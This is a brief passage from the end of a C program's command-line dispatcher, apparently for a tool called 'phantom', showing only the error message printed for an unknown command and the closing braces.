        printf("[-] Error: Unknown command '%s'. Run 'phantom help'.\n", argv[1]);
        return 1;
    }
}
